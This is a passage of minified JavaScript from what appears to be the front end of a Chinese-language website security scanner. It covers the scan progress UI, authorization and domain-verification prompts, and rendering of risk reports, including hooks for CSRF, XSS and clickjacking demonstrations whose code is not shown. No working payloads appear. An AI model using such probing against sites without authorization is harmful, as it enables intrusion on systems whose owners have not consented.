h=/^(\d{1,3}\.){3}\d{1,3}$/.test(p)||p.indexOf(":")>=0,m=p==="localhost",g=p.indexOf(".")>=0;if(!h&&!m&&!g){be=!1,ue("scan-btn",!1),L("网址格式不正确，请输入完整域名（如 example.com）或 IP 地址");return}}catch{be=!1,ue("scan-btn",!1),L("网址格式不正确，请输入有效的 URL");return}let o=it(r);Ee("result");let a='<div class="report-header fade-in-up"><div style="font-size:48px;margin-bottom:16px"></div><h2 style="margin-bottom:8px;font-size:clamp(16px,5vw,22px)">正在扫描 '+S(o)+`</h2><p style="color:var(--text-lighter);font-size:13px;margin-bottom:20px">安全扫描引擎正在执行目标扫描...</p><div style="max-width:min(320px,90vw);margin:0 auto 20px;background:rgba(255,255,255,0.1);border-radius:2px;height:8px;overflow:hidden"><div id="scan-progress-bar" style="height:100%;background:linear-gradient(90deg,#4b6eaf,#818cf8);width:5%;border-radius:2px;transition:width 0.3s"></div></div><div id="scan-progress-text" style="font-size:12px;color:var(--text-lighter)">正在初始化扫描引擎...</div><button onclick="cancelScan()" style="margin-top:20px;padding:10px 24px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;cursor:pointer;font-size:13px;font-weight:500;transition:background 0.15s" onmouseover="this.style.background='rgba(199,84,80,0.25)'" onmouseout="this.style.background='rgba(199,84,80,0.15)'"> 取消扫描</button></div>`,n=document.getElementById("result-content");n&&(n.innerHTML=a);let d=document.querySelector('input[name="scan-depth"]:checked'),v=(d&&d.value||"standard")==="deep";_n(r,o,v,t)}catch(e){console.error("startScan error:",e),be=!1,ue("scan-btn",!1),ue("scan-btn-step1",!1);let i=document.getElementById("result-content");i?i.innerHTML='<div class="card" style="text-align:center;padding:40px 20px"><div style="font-size:48px;margin-bottom:12px">错误：</div><h3 style="color:var(--danger);margin-bottom:8px">启动失败</h3><p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">页面在启动扫描时遇到问题。</p><p style="color:var(--text-lighter);font-size:12px;margin-bottom:16px">错误信息：'+S(e.message||String(e))+`</p><button class="btn btn-primary" onclick="navigateTo('home')"> 返回首页</button></div>`:L("启动失败："+(e.message||String(e)),"error")}}function Ps(){be&&(Ie=!0,be=!1,ue("scan-btn",!1),typeof Ne=="function"&&Ne(),typeof ci=="function"&&ci(),L("扫描已取消"),setTimeout(function(){Ee("home"),Ie=!1},300))}function _n(e,i,t,s){Sn();let o=setTimeout(function(){Ie||(Ne(),setTimeout(function(){Ie||(bt("扫描超时，目标网站可能响应缓慢或无法访问。请检查网址是否正确，或稍后重试。",e),be=!1,ue("scan-btn",!1),ue("scan-btn-step1",!1),ue("scan-btn-step1",!1))},600))},t?12e4:6e4);ce("/api/scan",{method:"POST",body:JSON.stringify({url:e,depth:t?"deep":"standard",authorized:!!s})}).then(function(a){if(!Ie)return clearTimeout(o),a.json().then(function(n){return n._status=a.status,n}).catch(function(){throw new Error("服务器返回异常（HTTP "+a.status+"），请稍后重试")})}).then(function(a){if(!Ie){if(clearTimeout(o),Jt(a)){Ne(),setTimeout(function(){if(Ie)return;L($t(a),"error");let n=document.getElementById("result-content");n&&(n.innerHTML='<div class="card" style="text-align:center;padding:36px 20px"><div style="font-size:44px;margin-bottom:12px">额度不足</div><h3 style="margin:0 0 8px;color:var(--warning)">当前额度不够继续扫描</h3><p style="color:var(--text-secondary);font-size:13px;line-height:1.7;margin:0 0 16px">'+S($t(a))+`</p><button class="btn btn-primary" onclick="navigateTo('billing')">去充值</button> <button class="btn btn-secondary" onclick="navigateTo('profile')">查看额度</button></div>`),Fe(),be=!1,ue("scan-btn",!1)},600);return}if(a._status&&a._status>=400){Ne(),setTimeout(function(){if(Ie)return;let n=Ue(a);a._status===403?n=n+`

如需扫描自有域名，请先完成域名归属验证；如果只是体验功能，请改用 example.com、httpbin.org 等公开演示站点。`:a._status===429&&(n="扫描请求过于频繁，请等待 1 分钟后重试。"),bt(n,e),be=!1,ue("scan-btn",!1)},600);return}if(a.error){Ne(),setTimeout(function(){Ie||(bt(Ue(a),e),be=!1,ue("scan-btn",!1))},600);return}Ne(),setTimeout(function(){if(Ie)return;let n=Fs(e,a);de=n,An(),_t(n),be=!1,ue("scan-btn",!1),ue("scan-btn-step1",!1),Fe()},400)}}).catch(function(a){Ie||(clearTimeout(o),Ne(),setTimeout(function(){if(Ie)return;let n=pt(a)||"扫描服务连接失败，请检查网络或稍后重试";bt(n,e),be=!1,ue("scan-btn",!1),ue("scan-btn-step1",!1)},600))})}function Fs(e,i){let t=it(e);i=i||{};let s=Array.isArray(i.findings)?i.findings:[];s.forEach(function(n){if(n.severity&&!n.level_zh){let d={high:"高风险",medium:"中风险",low:"低风险",critical:"严重"};n.level_zh=d[n.severity]||"低风险",n.level=n.level_zh}});let r=i.score,o=i.risk_level,a={summary:"对 "+t+" 的真实安全扫描已完成。共发现 "+s.length+" 个安全问题，综合安全评分为 "+r+" 分（满分 100）。",priority:s.length>0?'优先修复标记为"高风险"的安全问题。':"安全状况良好，建议持续监控。",boundary:"本次检测基于真实 HTTP 响应头判断。"};return{url:e,time:new Date().toLocaleString("zh-CN"),score:r,risk_level:o,scan_mode:"real",scan_id:i.scan_id||null,ai_report:a,owasp_coverage:i.owasp_coverage||[],findings:s,header_details:i.header_details||[],info_leaks:i.info_leaks||[],cors:i.cors||null,cookie_issues:i.cookie_issues||[],raw_headers:i.raw_headers||{},is_https:i.is_https!==!1,restricted:i.restricted||!1,restricted_reason:i.restricted_reason||"",restricted_code:i.restricted_code||"",redirected:i.redirected||!1,redirect_reason:i.redirect_reason||"",headers:i.headers||i.raw_headers||{},waf:i.waf||(i.waf_list&&i.waf_list[0]?i.waf_list[0].name:null),ssl:i.ssl||i.ssl_info||{},duration_ms:i.duration_ms||0,report_share_id:i.report_share_id||null,discovered_at:s.length>0&&s[0].discovered_at?s[0].discovered_at:new Date().toISOString()}}function bt(e,i){let t=document.getElementById("result-content");if(!t){setTimeout(function(){bt(e,i)},0);return}let s=S(i),r=/login|redirect|spm|havana|sso|auth|signin/i.test(i),o=i.length>80,a="";try{let h=new URL(i);a=h.protocol+"//"+h.hostname}catch{}let n=e&&(e.indexOf("无法解析")!==-1||e.indexOf("DNS")!==-1);if(e&&e.indexOf("超时"),e&&e.indexOf("无法连接"),e&&(e.indexOf("域名归属验证")!==-1||e.indexOf("域名验证")!==-1)){let h='<div class="card" style="padding:24px;background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.3);border-radius:2px;text-align:center;max-width:600px;margin:0 auto;">';h+='<div style="font-size:14px;font-weight:600;color:#4b6eaf;margin-bottom:12px">安全登录</div>',h+='<h3 style="margin:0 0 8px;color:#4b6eaf">深度扫描需要域名归属验证</h3>',h+='<p style="color:var(--text-secondary);margin:0 0 20px;font-size:14px;line-height:1.6">'+S(e)+"</p>",h+='<p style="color:var(--text-secondary);margin:0 0 20px;font-size:13px">为了符合安全要求，深度扫描（爬虫 + 漏洞探测）需要先证明您拥有该域名。</p>',h+='<div style="display:flex;gap:12px;justify-content:center;flex-wrap:wrap">',h+=`<button onclick="document.getElementById('scan-url').value='`+s+`'; goVerifyStep2();" class="btn-primary" style="padding:10px 20px;border-radius:2px;border:none;background:#4b6eaf;color:white;cursor:pointer;font-size:14px">立即验证域名</button>`,h+=`<button onclick="startScanDirect('`+s+`', false)" class="btn-secondary" style="padding:10px 20px;border-radius:2px;border:1px solid var(--border);background:transparent;color:var(--text-primary);cursor:pointer;font-size:14px">改用普通扫描</button>`,h+="</div></div>",t.innerHTML=h;return}let f="扫描未完成",v=e,c=["&#x2022; 目标站点可能拒绝自动化请求（反爬机制）","&#x2022; 目标需要登录或身份认证","&#x2022; 当前 URL 是跳转/登录链接，不是主站","&#x2022; 网站设置了访问限制（如 IP 黑名单）","&#x2022; 网站已下线或服务器故障"];n&&(f="域名无法解析",c=["&#x2022; 网址拼写错误，或域名尚未注册","&#x2022; DNS 服务器暂时无法解析","&#x2022; 本地网络 DNS 配置问题"]);let p='<div class="report-header fade-in-up">';p+='<div style="margin-bottom:12px">',p+='<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">扫描未完成</span>',p+="</div>",p+='<div class="score-ring-wrap">',p+='<div class="score-ring" style="background:#3c3f41">',p+='<div class="score-value" style="color:#fff">--</div>',p+='<div class="score-label" style="color:rgba(255,255,255,0.7)">无法评分</div>',p+="</div></div>",p+='<div class="report-url">'+s+"</div>",p+='<div class="report-time">'+new Date().toLocaleString("zh-CN")+"</div>",p+='<span class="risk-badge high">未完成</span>',p+="</div>",p+='<div class="card fade-in-up" style="animation-delay:0.1s;text-align:center;padding:40px 20px">',p+='<div style="font-size:48px;margin-bottom:16px"></div>',p+='<h3 style="margin-bottom:12px;color:var(--danger)">'+f+"</h3>",p+='<p style="color:var(--text-light);margin-bottom:20px;max-width:400px;margin-left:auto;margin-right:auto">'+S(v)+"</p>",(r||o)&&(p+='<div style="background:rgba(240,167,50,0.1);border:1px solid rgba(240,167,50,0.3);border-radius:var(--radius-sm);padding:16px;text-align:left;font-size:13px;color:var(--text-secondary);line-height:2;margin-bottom:16px">',p+="<p><strong>提示： 检测到登录/跳转长链接</strong></p>",p+="<p>建议扫描网站主域名，而不是登录页或跳转链接。</p>",a&&(p+='<div style="margin-top:10px;text-align:center">',p+=`<button class="btn btn-primary" onclick="retryScanWithUrl('`+S(a)+`')" style="font-size:13px"> 改扫主域名：`+S(a)+"</button>",p+="</div>"),p+="</div>"),p+='<div style="background:var(--bg);border-radius:var(--radius-sm);padding:16px;text-align:left;font-size:13px;color:var(--text-secondary);line-height:2">',p+="<p><strong>可能的原因：</strong></p>",c.forEach(function(h){p+="<p>"+h+"</p>"}),p+="</div>",p+='<div style="margin-top:20px;text-align:left;border-top:1px solid var(--border);padding-top:20px">',p+='<label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">修改网址重新扫描：</label>',p+='<div style="display:flex;gap:8px">',p+='<input id="retry-url-input" type="url" value="'+s+'" style="flex:1;padding:10px 14px;border:2px solid var(--border);border-radius:2px;font-size:14px;outline:none" />',p+='<button class="btn btn-primary" onclick="retryScan()" style="white-space:nowrap"> 重试</button>',p+="</div>",p+='<div style="margin-top:12px;text-align:center">',p+='<button onclick="backToScanInput()" style="background:none;border:none;color:var(--primary);font-size:13px;cursor:pointer"><- 返回修改网址</button>',p+="</div></div>",p+="</div>",t.innerHTML=p,Ee("result")}function js(e){be=!1,ue("scan-btn",!1);let i=document.getElementById("scan-url");i&&(i.value=e),wi()}function Hs(){be=!1,ue("scan-btn",!1);let e=document.getElementById("verify-step-1"),i=document.getElementById("verify-step-2"),t=document.getElementById("verify-step-3");e&&(e.style.display="block"),i&&(i.style.display="none"),t&&(t.style.display="none");let s=document.getElementById("result-content");s&&(s.innerHTML=""),Ee("scan")}function Ds(){be=!1,ue("scan-btn",!1);let e=document.getElementById("retry-url-input");if(!e)return;let i=e.value.trim();if(!i){L("请输入有效网址");return}let t=document.getElementById("auth-check");if(!t||!t.checked){L("请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。");return}/^https?:\/\//i.test(i)||(i="https://"+i),e.value=i;let s=it(i),r=document.getElementById("result-content");if(!r)return;let a=[{id:"dns",label:"DNS 解析",detail:s},{id:"connect",label:"TCP 连接",detail:"443/80 端口"},{id:"headers",label:"响应头判断",detail:"9 项安全头"},{id:"ssl",label:"SSL 证书检查",detail:"证书链/有效期"},{id:"sensitive",label:"敏感路径扫描",detail:"12 个路径"},{id:"waf",label:"WAF 识别",detail:"6 类厂商指纹"},{id:"report",label:"报告",detail:"评分/建议"}].map(function(v,c){return'<div id="stage-'+v.id+'" class="scan-stage" style="display:flex;align-items:center;gap:10px;padding:10px 12px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:2px;margin-bottom:6px;opacity:0.4;transition:all 0.3s"><div class="stage-icon" style="width:24px;height:24px;border-radius:50%;background:rgba(75,110,175,0.15);display:flex;align-items:center;justify-content:center;font-size:12px;color:#a5b4fc">...</div><div style="flex:1"><div style="font-size:13px;font-weight:600">'+v.label+'</div><div style="font-size:11px;color:var(--text-secondary)">'+v.detail+'</div></div><div class="stage-status" style="font-size:11px;color:var(--text-secondary)">等待</div></div>'}).join(""),n='<div class="report-header fade-in-up"><div style="position:relative;height:160px;margin-bottom:16px;display:flex;align-items:center;justify-content:center"><div id="scan-3d-orbit" style="position:relative;width:140px;height:140px"><div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(75,110,175,0.3);animation:spin 3s linear infinite"></div><div style="position:absolute;inset:14px;border-radius:50%;border:2px solid rgba(168,85,247,0.4);animation:spin 2s linear infinite reverse"></div><div style="position:absolute;inset:28px;border-radius:50%;border:2px solid rgba(115,201,144,0.3);animation:spin 4s linear infinite"></div><div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(75,110,175,0.4);animation:pulse-ring 2s ease-out infinite"></div><div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(168,85,247,0.3);animation:pulse-ring 2s ease-out infinite 0.6s"></div><div id="scan-3d-core" style="position:absolute;inset:42px;border-radius:50%;background:radial-gradient(circle,rgba(75,110,175,0.7),rgba(75,110,175,0.15));display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;box-shadow:0 0 30px rgba(75,110,175,0.5)"><span id="scan-percent" style="font-size:26px;font-weight:800;line-height:1">0%</span><span style="font-size:9px;opacity:0.8;margin-top:2px">扫描中</span></div></div></div><div style="max-width:min(420px,calc(100% - 32px));margin:0 auto 16px"><div style="height:6px;background:rgba(255,255,255,0.1);border-radius:3px;overflow:hidden"><div id="scan-main-progress" style="height:100%;width:0%;background:#3c3f41;border-radius:3px;transition:width 0.5s ease;box-shadow:0 0 10px rgba(75,110,175,0.5)"></div></div></div><div id="scan-live-text" style="height:20px;font-size:12px;color:#a5b4fc;margin-bottom:14px;text-align:center;overflow:hidden;transition:all 0.3s"><span style="display:inline-block;animation:scan-text-glow 1.5s ease-in-out infinite">正在初始化扫描引擎...</span></div><h2 style="margin-bottom:6px;font-size:clamp(16px,5vw,20px)">正在扫描 '+S(s)+'</h2><p style="color:var(--text-lighter);font-size:12px;margin-bottom:18px">安全扫描引擎 · 7 阶段实时扫描中</p><div style="max-width:min(420px,calc(100% - 32px));margin:0 auto;text-align:left">'+a+`</div><button onclick="cancelScan()" style="margin-top:20px;padding:10px 24px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;cursor:pointer;font-size:13px;font-weight:600;transition:all 0.2s" onmouseover="this.style.background='rgba(199,84,80,0.25)'" onmouseout="this.style.background='rgba(199,84,80,0.15)'"> 取消扫描</button></div><style>@keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}@keyframes pulse-ring{0%,100%{transform:scale(1);opacity:1}}@keyframes scan-text-glow{0%,100%{opacity:1}}</style>`;r.innerHTML=n,En();let f=((document.querySelector('input[name="scan-depth"]:checked')||{}).value||"standard")==="deep";_n(i,s,f)}function Xt(e,i){let t=document.getElementById("stage-"+e);if(!t)return;t.style.opacity="1";let s=t.querySelector(".stage-icon"),r=t.querySelector(".stage-status");i==="running"?(t.style.background="rgba(75,110,175,0.12)",t.style.borderColor="rgba(75,110,175,0.4)",s.style.background="rgba(75,110,175,0.4)",s.style.color="#fff",s.innerHTML="刷新",s.style.animation="spin 1s linear infinite",r.innerHTML='<span style="color:#a5b4fc">扫描中</span>'):i==="done"?(t.style.background="rgba(115,201,144,0.1)",t.style.borderColor="rgba(115,201,144,0.3)",s.style.background="rgba(115,201,144,0.3)",s.style.color="#73c990",s.style.animation="none",s.innerHTML="",r.innerHTML='<span style="color:#73c990">完成</span>'):i==="fail"&&(t.style.background="rgba(199,84,80,0.1)",t.style.borderColor="rgba(199,84,80,0.3)",s.style.background="rgba(199,84,80,0.3)",s.style.color="#c75450",s.style.animation="none",s.innerHTML="",r.innerHTML='<span style="color:#c75450">失败</span>')}function Sn(){let e=["dns","connect","headers","ssl","sensitive","waf","report"],i=0;De&&(clearInterval(De),De=null);function t(){i>0&&i<=e.length&&Xt(e[i-1],"done"),i<e.length?(Xt(e[i],"running"),i++):(clearInterval(De),De=null)}t(),De=setInterval(t,700)}function Ne(){De&&(clearInterval(De),De=null),["dns","connect","headers","ssl","sensitive","waf","report"].forEach(function(i){Xt(i,"done")}),zn(100,"扫描完成，报告...")}function En(){Te=0,Lt=0,Oe&&(clearInterval(Oe),Oe=null),Ae&&(Ae.forEach(function(i){clearTimeout(i)}),Ae=[]);let e=0;Oe=setInterval(function(){Te<30?e+=Math.random()*5+2:Te<60?e+=Math.random()*3+1:Te<85?e+=Math.random()*2+.5:e+=Math.random()*.8+.2,e=Math.min(e,95),Te<e&&(Te+=(e-Te)*.3,Te=Math.min(Te,95));let i=document.getElementById("scan-main-progress"),t=document.getElementById("scan-percent");if(i&&(i.style.width=Math.round(Te)+"%"),t&&(t.textContent=Math.round(Te)+"%"),Math.random()<.15&&Lt<Hi.length-1){Lt++;let s=document.getElementById("scan-live-text");if(s){s.style.opacity="0";let r=setTimeout(function(){if(!Oe)return;let o=s.querySelector("span");o&&(o.textContent=Hi[Lt]),s.style.opacity="1"},200);Ae||(Ae=[]),Ae.push(r)}}},200)}function ci(){Oe&&(clearInterval(Oe),Oe=null),Ae&&(Ae.forEach(function(e){clearTimeout(e)}),Ae=[])}function zn(e,i){Te=e;let t=document.getElementById("scan-main-progress"),s=document.getElementById("scan-percent");if(t&&(t.style.width=e+"%"),s&&(s.textContent=Math.round(e)+"%"),i){let r=document.getElementById("scan-live-text");if(r){let o=r.querySelector("span");o&&(o.textContent=i)}}e>=100&&(Oe&&(clearInterval(Oe),Oe=null),Ae&&(Ae.forEach(function(r){clearTimeout(r)}),Ae=[]))}function Cn(e){let i=[{name:"安全响应头",score:0},{name:"SSL/TLS",score:0},{name:"敏感文件",score:0},{name:"WAF 防护",score:0},{name:"漏洞检测",score:0}],t=e.findings||[];t.forEach(function(c){let p=(c.name||"").toLowerCase(),h=(c.owasp||"").toLowerCase();(p.indexOf("安全响应头")>=0||p.indexOf("响应头")>=0||h.indexOf("a05")>=0)&&(i[0].score=Math.max(i[0].score,c.level==="高风险"?30:c.level==="中风险"?60:80)),(p.indexOf("https")>=0||p.indexOf("ssl")>=0||p.indexOf("tls")>=0||p.indexOf("证书")>=0)&&(i[1].score=Math.max(i[1].score,c.level==="高风险"?30:c.level==="中风险"?60:80)),(p.indexOf("敏感文件")>=0||p.indexOf(".env")>=0||p.indexOf(".git")>=0||p.indexOf("暴露")>=0)&&(i[2].score=Math.max(i[2].score,c.level==="高风险"?30:c.level==="中风险"?60:80)),(p.indexOf("waf")>=0||p.indexOf("防火墙")>=0)&&(i[3].score=Math.max(i[3].score,c.level==="高风险"?30:c.level==="中风险"?60:80)),(p.indexOf("注入")>=0||p.indexOf("xss")>=0||p.indexOf("sql")>=0||p.indexOf("csrf")>=0)&&(i[4].score=Math.max(i[4].score,c.level==="高风险"?30:c.level==="中风险"?60:80))});let s=t.length>0;i.forEach(function(c){c.score===0&&(c.score=s?85:95)});let r=150,o=150,a=110,n=i.length,d=[],f='<svg viewBox="0 0 300 300" style="max-width:300px;margin:0 auto;display:block" aria-label="安全维度">';for(let c=1;c<=5;c++){let p=a*c/5,h=[];for(let m=0;m<n;m++){let g=-Math.PI/2+m*2*Math.PI/n;h.push((r+p*Math.cos(g)).toFixed(1)+","+(o+p*Math.sin(g)).toFixed(1))}f+='<polygon points="'+h.join(" ")+'" fill="none" stroke="rgba(75,110,175,0.15)" stroke-width="1"/>'}for(let c=0;c<n;c++){let p=-Math.PI/2+c*2*Math.PI/n;f+='<line x1="'+r+'" y1="'+o+'" x2="'+(r+a*Math.cos(p)).toFixed(1)+'" y2="'+(o+a*Math.sin(p)).toFixed(1)+'" stroke="rgba(75,110,175,0.2)" stroke-width="1"/>'}let v=[];for(let c=0;c<n;c++){let p=-Math.PI/2+c*2*Math.PI/n,h=a*i[c].score/100;v.push((r+h*Math.cos(p)).toFixed(1)+","+(o+h*Math.sin(p)).toFixed(1)),d.push({x:r+h*Math.cos(p),y:o+h*Math.sin(p),name:i[c].name,score:i[c].score})}return f+='<polygon points="'+v.join(" ")+'" fill="rgba(75,110,175,0.35)" stroke="#4b6eaf" stroke-width="2"/>',d.forEach(function(c){f+='<circle cx="'+c.x.toFixed(1)+'" cy="'+c.y.toFixed(1)+'" r="4" fill="#4b6eaf" stroke="#bbbbbb" stroke-width="1.5"/>'}),d.forEach(function(c,p){let h=-Math.PI/2+p*2*Math.PI/n,m=r+(a+22)*Math.cos(h),g=o+(a+22)*Math.sin(h),y=m<r-5?"end":m>r+5?"start":"middle";f+='<text x="'+m.toFixed(1)+'" y="'+g.toFixed(1)+'" text-anchor="'+y+'" dominant-baseline="middle" font-size="11" font-weight="600" fill="currentColor">'+S(c.name)+" "+c.score+"</text>"}),f+="</svg>",f}function _t(e){try{if(Tr(e)){qr(),Ee("result"),an(e),de=e,An(e);return}e=e||{},e.findings=Array.isArray(e.findings)?e.findings:[],e.owasp_coverage=Array.isArray(e.owasp_coverage)?e.owasp_coverage:[],e.header_details=Array.isArray(e.header_details)?e.header_details:[],e.info_leaks=Array.isArray(e.info_leaks)?e.info_leaks:[],e.cookie_issues=Array.isArray(e.cookie_issues)?e.cookie_issues:[],e.waf=Array.isArray(e.waf)?e.waf:[],e.sensitive_paths=Array.isArray(e.sensitive_paths)?e.sensitive_paths:[],e.crawled_pages=Array.isArray(e.crawled_pages)?e.crawled_pages:[],e.vuln_tests=Array.isArray(e.vuln_tests)?e.vuln_tests:[],e.score_breakdown=Array.isArray(e.score_breakdown)?e.score_breakdown:[],e.owasp_coverage=Array.isArray(e.owasp_coverage)?e.owasp_coverage:[],e.ai_report=e.ai_report&&typeof e.ai_report=="object"?e.ai_report:{summary:"扫描完成",priority:"暂无优先事项"},e.score=typeof e.score=="number"?e.score:parseInt(e.score,10)||0,e.score=Math.max(0,Math.min(100,e.score)),e.raw_headers=e.raw_headers&&typeof e.raw_headers=="object"?e.raw_headers:{};let i=0,t=0,s=0;e.findings.forEach(function(l){l.level==="高风险"?i++:l.level==="中风险"?t++:s++});let r=e.score<50?"high":e.score<75?"medium":"low",o=jt(e.score),a=Nt(e.score),n="";n+='<div class="report-header fade-in-up">',n+='<div style="margin-bottom:12px">',e.restricted?n+='<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(240,167,50,0.15);color:#f0a732;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">受限扫描报告</span>':n+='<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(115,201,144,0.15);color:#73c990;border:1px solid rgba(115,201,144,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">真实扫描</span>',n+="</div>",e.tls_verify_skipped&&(n+='<div style="background:rgba(199,84,80,0.08);border:1px solid rgba(199,84,80,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#c75450;line-height:1.6">',n+="<strong>诊断模式</strong><br/>",n+="当前扫描跳过了 TLS 证书验证，结果仅供诊断参考。生产环境建议开启 TLS_VERIFY=true。",n+="</div>"),e.restricted?(n+='<div style="background:rgba(240,167,50,0.08);border:1px solid rgba(240,167,50,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#f0a732;line-height:1.6">',n+="<strong>受限扫描报告</strong><br/>",n+="目标可访问，但存在登录/WAF/反爬限制（HTTP "+(e.restricted_code||"")+"），<br/>",n+="本次扫描受到登录态、WAF 或反爬限制影响，部分结果仅供复核参考。",n+="</div>"):e.restricted_reason&&(n+='<div style="background:rgba(240,167,50,0.08);border:1px solid rgba(240,167,50,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#f0a732;line-height:1.6">',n+="<strong>受限访问提示</strong><br/>"+S(e.restricted_reason),n+="</div>"),e.redirected&&(n+='<div style="background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#4b6eaf;line-height:1.6">',n+='<div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px">',n+="<div><strong>跳转提示</strong><br/>",n+=S(e.redirect_reason||"目标发生跳转，建议扫描最终目标地址。"),n+="</div>",n+=`<button onclick="scanRedirectTarget()" style="background:rgba(59,130,246,0.15);color:#4b6eaf;border:1px solid rgba(59,130,246,0.3);padding:6px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;white-space:nowrap;transition:background 0.15s" onmouseover="this.style.background='rgba(59,130,246,0.25)'" onmouseout="this.style.background='rgba(59,130,246,0.15)'">扫描最终地址</button>`,n+="</div></div>"),n+='<div class="score-ring-wrap score-pulse">',n+='<div class="score-ring" style="background:'+o+'">',n+='<div class="score-value" style="color:#fff">'+e.score+"</div>",n+='<div class="score-label" style="color:rgba(255,255,255,0.7)">安全评分</div>',n+="</div></div>",n+='<div class="report-url">'+S(e.url||"")+"</div>",n+='<div class="report-time">'+(e.time||"")+"</div>",n+='<span class="risk-badge '+r+'">'+(e.risk_level||"未知")+"</span>",n+="</div>";let d="";if(i+t>0?d="当前结果包含 "+i+" 个高风险和 "+t+" 个中风险项，建议先修复高风险项，再复测确认。":s>0?d="当前风险以低危和提示项为主，建议保持修复节奏并持续监控。":d="当前未发现明显风险，可作为基线结果保留，并在版本变更后复测。",n+='<div class="card fade-in-up" style="animation-delay:0.05s;padding:14px;margin-top:12px;border:1px solid rgba(75,110,175,0.25);background:rgba(60,63,65,0.9)">',n+='<div style="display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;margin-bottom:6px">',n+='<div style="font-size:13px;font-weight:700;color:var(--text-primary)">概览</div>',n+='<div style="font-size:12px;color:var(--text-secondary)">'+(e.restricted?"受限扫描，结论需复核":"可直接进入修复与复测")+"</div>",n+="</div>",n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">'+S(d)+"</div>",n+='<div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:10px;font-size:12px;color:var(--text-secondary)">',n+="<span>总发现："+(e.findings.length||0)+"</span>",n+="<span>高/中风险："+i+"/"+t+"</span>",n+="<span>最近评分："+e.score+"</span>",n+="</div>",n+="</div>",n+='<div class="risk-stats fade-in-up" style="animation-delay:0.1s">',n+='<div class="risk-stat high"><div class="num">'+i+'</div><div class="label">高风险</div></div>',n+='<div class="risk-stat medium"><div class="num">'+t+'</div><div class="label">中风险</div></div>',n+='<div class="risk-stat low"><div class="num">'+s+'</div><div class="label">低风险</div></div>',n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.15s">',n+='<div class="card-title">安全维度</div>',n+='<div id="radar-chart-container" style="display:flex;justify-content:center"></div>',n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.2s">',n+='<div class="card-title">风险说明</div>',n+='<p style="margin:0 0 14px 0;font-size:12px;color:var(--text-secondary)">以下示例用于辅助说明常见风险的业务影响与整改必要性。</p>',n+='<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px">',n+=`<button onclick="simulateCSRF('`+xe(e.url)+`')" style="padding:10px 8px;border:1px solid rgba(199,84,80,0.3);background:rgba(199,84,80,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#dc2626;transition:background 0.15s" onmouseover="this.style.background='rgba(199,84,80,0.15)'" onmouseout="this.style.background='rgba(199,84,80,0.08)'">`,n+='<div style="font-size:13px;font-weight:600;color:var(--text-primary)">CSRF</div>',n+='<div style="font-size:11px;font-weight:400;color:#7f1d1d">跨站请求伪造</div></button>',n+=`<button onclick="simulateXSS('`+xe(e.url)+`')" style="padding:10px 8px;border:1px solid rgba(240,167,50,0.3);background:rgba(240,167,50,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#ea580c;transition:background 0.15s" onmouseover="this.style.background='rgba(240,167,50,0.15)'" onmouseout="this.style.background='rgba(240,167,50,0.08)'">`,n+='<div style="font-size:13px;font-weight:600;color:var(--text-primary)">XSS</div>',n+='<div style="font-size:11px;font-weight:400;color:#f0a732">跨站脚本</div></button>',n+=`<button onclick="simulateClickjacking('`+xe(e.url)+`')" style="padding:10px 8px;border:1px solid rgba(168,85,247,0.3);background:rgba(168,85,247,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#9333ea;transition:background 0.15s" onmouseover="this.style.background='rgba(168,85,247,0.15)'" onmouseout="this.style.background='rgba(168,85,247,0.08)'">`,n+='<div style="font-size:13px;font-weight:600;color:var(--text-primary)">Clickjacking</div>',n+='<div style="font-size:11px;font-weight:400;color:#c084fc">点击劫持</div></button>',n+="</div>",n+='<div id="attack-演示-result" style="margin-top:14px"></div>',n+="</div>",e.score_breakdown&&e.score_breakdown.length>0){let l=e.score_breakdown.reduce(function(re,ae){return re+ae.deduction},0),A=0,J=0,N=0,U=0,q=[],te=[],B=[],I=[];e.score_breakdown.forEach(function(re){re.severity==="critical"?(A+=re.deduction,q.push(re)):re.severity==="high"?(J+=re.deduction,te.push(re)):re.severity==="medium"?(N+=re.deduction,B.push(re)):(U+=re.deduction,I.push(re))}),n+='<div class="card fade-in-up" style="animation-delay:0.25s">',n+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">',n+='<div style="display:flex;align-items:center;gap:10px">',n+='<div class="card-title" style="margin:0">评分解读</div>',n+="</div>",n+='<span 